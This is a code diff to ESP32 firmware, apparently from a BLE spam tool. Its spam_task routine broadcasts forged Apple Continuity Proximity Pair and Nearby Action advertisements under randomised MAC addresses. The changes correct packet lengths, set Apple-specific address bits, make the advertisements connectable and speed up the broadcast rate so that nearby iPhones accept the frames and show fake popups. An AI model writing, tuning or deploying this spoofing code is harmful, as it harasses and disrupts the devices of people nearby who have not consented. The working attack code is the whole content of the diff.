@@ -315,7 +315,7 @@ static void generate_proximity_pair_packet(uint8_t* adv_data, size_t* adv_len, u
     
     // Continuity Header
     adv_data[(*adv_len)++] = CONTINUITY_TYPE_PROXIMITY_PAIR; // Type: Proximity Pair
-    adv_data[(*adv_len)++] = 0x19; // Length of data
+    adv_data[(*adv_len)++] = 0x15; // Length of data
     adv_data[(*adv_len)++] = 0x01; // Status flags
     
     // Device Model (little endian)
@@ -341,14 +341,14 @@ static void generate_nearby_action_packet(uint8_t* adv_data, size_t* adv_len, ui
     adv_data[(*adv_len)++] = 0x1A; // LE General Discoverable + BR/EDR Not Supported
     
     // Apple Continuity Service Data
-    adv_data[(*adv_len)++] = 0x06; // Length (6 bytes)
+    adv_data[(*adv_len)++] = 0x08; // Length (8 bytes)
     adv_data[(*adv_len)++] = 0x16; // Type: Service Data
     adv_data[(*adv_len)++] = 0xD2; // Apple Continuity Service UUID (0x004C)
     adv_data[(*adv_len)++] = 0xFE;
     
     // Continuity Header
     adv_data[(*adv_len)++] = CONTINUITY_TYPE_NEARBY_ACTION; // Type: Nearby Action
-    adv_data[(*adv_len)++] = 0x05; // Length of data
+    adv_data[(*adv_len)++] = 0x03; // Length of data
     adv_data[(*adv_len)++] = action_type; // Action type
     adv_data[(*adv_len)++] = 0x00; // Action flags
     adv_data[(*adv_len)++] = 0x00; // Authentication tag
@@ -386,25 +386,26 @@ static void spam_task(void *arg) {
         
         vTaskDelay(pdMS_TO_TICKS(50));
 
-        // stop any active advertising before changing mac address
         if (ble_gap_adv_active()) {
             ble_gap_adv_stop();
-            vTaskDelay(pdMS_TO_TICKS(20)); // give more time for stack to settle
+            vTaskDelay(pdMS_TO_TICKS(20));
         }
 
-        uint8_t rnd_addr[6];
-        generate_random_mac(rnd_addr);
-        
-        int rc = ble_hs_id_set_rnd(rnd_addr);
-        if (rc != 0) {
-            ESP_LOGW(TAG_BLE, "Failed to set random address: %d", rc);
-            // continue with current address instead of failing
-        } else {
-            ESP_LOGD(TAG_BLE, "Set random MAC: %02X:%02X:%02X:%02X:%02X:%02X", 
-                     rnd_addr[0], rnd_addr[1], rnd_addr[2], rnd_addr[3], rnd_addr[4], rnd_addr[5]);
+        {
+            uint8_t rnd_addr[6];
+            generate_random_mac(rnd_addr);
+            if (current_spam_type == BLE_SPAM_APPLE) {
+                rnd_addr[5] |= 0xC0;
+            }
+            int rc = ble_hs_id_set_rnd(rnd_addr);
+            if (rc != 0) {
+                ESP_LOGW(TAG_BLE, "Failed to set random address: %d", rc);
+            } else {
+                ESP_LOGD(TAG_BLE, "Set random MAC: %02X:%02X:%02X:%02X:%02X:%02X",
+                         rnd_addr[0], rnd_addr[1], rnd_addr[2], rnd_addr[3], rnd_addr[4], rnd_addr[5]);
+            }
         }
         
-        // small delay after mac change before setting advertisement data
         vTaskDelay(pdMS_TO_TICKS(10));
 
         struct ble_hs_adv_fields fields;
@@ -443,16 +444,16 @@ static void spam_task(void *arg) {
                     uint8_t color = device->colors[esp_random() % device->color_count];
                     
                     mfg_buf[2] = 0x07;
-                    mfg_buf[3] = 0x19;
+                    mfg_buf[3] = 0x15;
                     mfg_buf[4] = 0x01;
                     mfg_buf[5] = (device->model >> 8) & 0xFF;
                     mfg_buf[6] = device->model & 0xFF;
                     mfg_buf[7] = 0x01;
                     mfg_buf[8] = color;
-                    for (int i = 9; i < 21; i++) {
+                    for (int i = 9; i < 25; i++) {
                         mfg_buf[i] = esp_random() & 0xFF;
                     }
-                    mfg_len = 21;
+                    mfg_len = 25;
                     ESP_LOGD(TAG_BLE, "Sending simplified Proximity Pair for %s (model: 0x%04X, color: 0x%02X)", 
                             device->name, device->model, color);
                 } else {
@@ -460,12 +461,11 @@ static void spam_task(void *arg) {
                     uint8_t action_type = nearby_actions[action_idx].action;
                     
                     mfg_buf[2] = 0x0F;
-                    mfg_buf[3] = 0x05;
+                    mfg_buf[3] = 0x03;
                     mfg_buf[4] = action_type;
-                    mfg_buf[5] = esp_random() & 0xFF;
-                    mfg_buf[6] = esp_random() & 0xFF;
-                    mfg_buf[7] = esp_random() & 0xFF;
-                    mfg_len = 8;
+                    mfg_buf[5] = 0x00;
+                    mfg_buf[6] = 0x00;
+                    mfg_len = 7;
                     ESP_LOGD(TAG_BLE, "Sending simplified Nearby Action: %s (0x%02X)", 
                             nearby_actions[action_idx].name, action_type);
                 }
@@ -560,7 +560,7 @@ static void spam_task(void *arg) {
             adv_len += mfg_len;
         }
 
-        rc = ble_gap_adv_set_data(adv_data, adv_len);
+        int rc = ble_gap_adv_set_data(adv_data, adv_len);
         if (rc != 0) {
             ESP_LOGE(TAG_BLE, "Failed to set advertisement data: %d", rc);
             continue;
@@ -568,8 +568,15 @@ static void spam_task(void *arg) {
 
         struct ble_gap_adv_params adv_params;
         memset(&adv_params, 0, sizeof(adv_params));
-        adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
+        if (current_spam_type == BLE_SPAM_APPLE) {
+            adv_params.conn_mode = BLE_GAP_CONN_MODE_UND;
+        } else {
+            adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
+        }
         adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
+        adv_params.itvl_min = 0x20;
+        adv_params.itvl_max = 0x30;
+        adv_params.channel_map = 0x07;
 
         uint8_t own_addr_type;
         rc = ble_hs_id_infer_auto(0, &own_addr_type);
@@ -586,19 +593,15 @@ static void spam_task(void *arg) {
             ESP_LOGE(TAG_BLE, "Failed to start advertisement: %d", rc);
             continue;
         }
-        
+
         spam_adv_count++;
         ESP_LOGD(TAG_BLE, "Successfully sent spam packet #%lu", (unsigned long)spam_adv_count);
 
-        // stop advertising after this packet to free resources
+        vTaskDelay(pdMS_TO_TICKS(adv_ms + 20));
         if (ble_gap_adv_active()) {
             ble_gap_adv_stop();
-            // clear advertisement data to free memory
-            ble_gap_adv_set_data(NULL, 0);
         }
-        
-        uint32_t sleep_ms = (esp_random() % 151) + 200;
-        vTaskDelay(pdMS_TO_TICKS(sleep_ms));
+        vTaskDelay(pdMS_TO_TICKS((esp_random() % 51) + 50));
     }
     
     // task cleanup - let stop function handle deletion
